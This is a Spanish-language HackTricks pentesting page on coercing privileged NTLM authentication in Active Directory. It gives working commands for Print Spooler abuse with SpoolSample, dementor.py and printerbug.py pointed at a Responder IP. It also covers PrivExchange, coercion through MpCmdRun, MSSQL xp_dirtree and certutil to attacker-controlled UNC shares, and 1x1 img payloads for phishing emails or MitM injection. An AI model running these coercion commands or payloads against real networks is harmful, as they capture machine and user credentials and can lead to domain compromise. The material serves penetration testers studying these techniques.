# Forzar Autenticación Privilegiada NTLM

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* ¿Trabajas en una **empresa de ciberseguridad**? ¿Quieres ver tu **empresa anunciada en HackTricks**? o ¿quieres tener acceso a la **última versión de PEASS o descargar HackTricks en PDF**? Consulta los [**PLANES DE SUSCRIPCIÓN**](https://github.com/sponsors/carlospolop)!
* Descubre [**La Familia PEASS**](https://opensea.io/collection/the-peass-family), nuestra colección de [**NFTs**](https://opensea.io/collection/the-peass-family) exclusivos
* Consigue el [**merchandising oficial de PEASS & HackTricks**](https://peass.creator-spring.com)
* **Únete al** [**💬**](https://emojipedia.org/speech-balloon/) [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **sígueme** en **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Comparte tus trucos de hacking enviando PRs al [repositorio de hacktricks](https://github.com/carlospolop/hacktricks) y al [repositorio de hacktricks-cloud](https://github.com/carlospolop/hacktricks-cloud)**.

</details>

## SharpSystemTriggers

[**SharpSystemTriggers**](https://github.com/cube0x0/SharpSystemTriggers) es una **colección** de **disparadores de autenticación remota** codificados en C# utilizando el compilador MIDL para evitar dependencias de terceros.

## Abuso del Servicio Spooler

Si el servicio _**Print Spooler**_ está **habilitado**, puedes usar algunas credenciales de AD ya conocidas para **solicitar** al servidor de impresión del Controlador de Dominio una **actualización** sobre nuevos trabajos de impresión y simplemente indicarle que **envíe la notificación a algún sistema**.\
Nota: cuando la impresora envía la notificación a sistemas arbitrarios, necesita **autenticarse contra** ese **sistema**. Por lo tanto, un atacante puede hacer que el servicio _**Print Spooler**_ se autentique contra un sistema arbitrario, y el servicio **usará la cuenta de la computadora** en esta autenticación.

### Encontrar Servidores Windows en el dominio

Usando PowerShell, obtén una lista de cajas Windows. Los servidores son usualmente la prioridad, así que centrémonos allí:
```bash
Get-ADComputer -Filter {(OperatingSystem -like "*windows*server*") -and (OperatingSystem -notlike "2016") -and (Enabled -eq "True")} -Properties * | select Name | ft -HideTableHeaders > servers.txt
```
### Búsqueda de servicios Spooler activos

Utilizando una versión ligeramente modificada de [SpoolerScanner](https://github.com/NotMedic/NetNTLMtoSilverTicket) de @mysmartlogin (Vincent Le Toux), comprueba si el Servicio Spooler está escuchando:
```bash
. .\Get-SpoolStatus.ps1
ForEach ($server in Get-Content servers.txt) {Get-SpoolStatus $server}
```
También puedes usar rpcdump.py en Linux y buscar el Protocolo MS-RPRN.
```bash
rpcdump.py DOMAIN/USER:PASSWORD@SERVER.DOMAIN.COM | grep MS-RPRN
```
### Solicitar al servicio que se autentique contra un host arbitrario

Puede compilar[ **SpoolSample desde aquí**](https://github.com/NotMedic/NetNTLMtoSilverTicket)**.**
```bash
SpoolSample.exe <TARGET> <RESPONDERIP>
```
o utiliza [**3xocyte's dementor.py**](https://github.com/NotMedic/NetNTLMtoSilverTicket) o [**printerbug.py**](https://github.com/dirkjanm/krbrelayx/blob/master/printerbug.py) si estás en Linux
```bash
python dementor.py -d domain -u username -p password <RESPONDERIP> <TARGET>
printerbug.py 'domain/username:password'@<Printer IP> <RESPONDERIP>
```
### Combinando con Delegación Sin Restricciones

Si un atacante ya ha comprometido una computadora con [Delegación Sin Restricciones](unconstrained-delegation.md), el atacante podría **hacer que la impresora se autentique contra esta computadora**. Debido a la delegación sin restricciones, el **TGT** de la **cuenta de computadora de la impresora** será **guardado en** la **memoria** de la computadora con delegación sin restricciones. Como el atacante ya ha comprometido este host, podrá **recuperar este ticket** y abusar de él ([Pass the Ticket](pass-the-ticket.md)).

## RCP Fuerza autenticación

{% embed url="https://github.com/p0dalirius/Coercer" %}

## PrivExchange

El ataque `PrivExchange` es el resultado de un fallo encontrado en la **función `PushSubscription` del Exchange Server**. Esta función permite que el servidor Exchange sea forzado por cualquier usuario del dominio con un buzón de correo para autenticarse en cualquier host proporcionado por el cliente a través de HTTP.

Por defecto, el **servicio Exchange se ejecuta como SYSTEM** y se le otorgan privilegios excesivos (específicamente, tiene **privilegios WriteDacl en el dominio antes de la Actualización Acumulativa de 2019**). Este fallo puede ser explotado para permitir el **reenvío de información a LDAP y posteriormente extraer la base de datos NTDS del dominio**. En casos donde no es posible el reenvío a LDAP, este fallo aún puede ser utilizado para reenviar y autenticar a otros hosts dentro del dominio. La explotación exitosa de este ataque otorga acceso inmediato al Admin del Dominio con cualquier cuenta de usuario de dominio autenticada.

## Dentro de Windows

Si ya estás dentro de la máquina Windows puedes forzar a Windows a conectarse a un servidor utilizando cuentas privilegiadas con:

### Defender MpCmdRun
```bash
C:\ProgramData\Microsoft\Windows Defender\platform\4.18.2010.7-0\MpCmdRun.exe -Scan -ScanType 3 -File \\<YOUR IP>\file.txt
```
### MSSQL
```sql
EXEC xp_dirtree '\\10.10.17.231\pwn', 1, 1
```
O utiliza esta otra técnica: [https://github.com/p0dalirius/MSSQL-Analysis-Coerce](https://github.com/p0dalirius/MSSQL-Analysis-Coerce)

### Certutil

Es posible usar certutil.exe lolbin (binario firmado por Microsoft) para forzar la autenticación NTLM:
```bash
certutil.exe -syncwithWU  \\127.0.0.1\share
```
## Inyección de HTML

### Vía email

Si conoces la **dirección de correo electrónico** del usuario que inicia sesión en una máquina que quieres comprometer, podrías simplemente enviarle un **correo electrónico con una imagen de 1x1** como
```html
<img src="\\10.10.17.231\test.ico" height="1" width="1" />
```
y cuando la abra, intentará autenticarse.

### MitM

Si puedes realizar un ataque MitM a una computadora e inyectar HTML en una página que visualizará, podrías intentar inyectar una imagen como la siguiente en la página:
```html
<img src="\\10.10.17.231\test.ico" height="1" width="1" />
```
## Crackeo de NTLMv1

Si puedes capturar [desafíos NTLMv1 lee aquí cómo crackearlos](../ntlm/#ntlmv1-attack).\
_Recuerda que para crackear NTLMv1 necesitas configurar el desafío de Responder a "1122334455667788"_

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* ¿Trabajas en una **empresa de ciberseguridad**? ¿Quieres ver tu **empresa anunciada en HackTricks**? o ¿quieres tener acceso a la **última versión de PEASS o descargar HackTricks en PDF**? Consulta los [**PLANES DE SUSCRIPCIÓN**](https://github.com/sponsors/carlospolop)!
* Descubre [**La Familia PEASS**](https://opensea.io/collection/the-peass-family), nuestra colección de [**NFTs**](https://opensea.io/collection/the-peass-family) exclusivos
* Consigue el [**merchandising oficial de PEASS & HackTricks**](https://peass.creator-spring.com)
* **Únete al** [**💬**](https://emojipedia.org/speech-balloon/) [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **sígueme** en **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Comparte tus trucos de hacking enviando PRs al [repositorio de hacktricks](https://github.com/carlospolop/hacktricks) y al [repositorio de hacktricks-cloud](https://github.com/carlospolop/hacktricks-cloud)**.

</details>
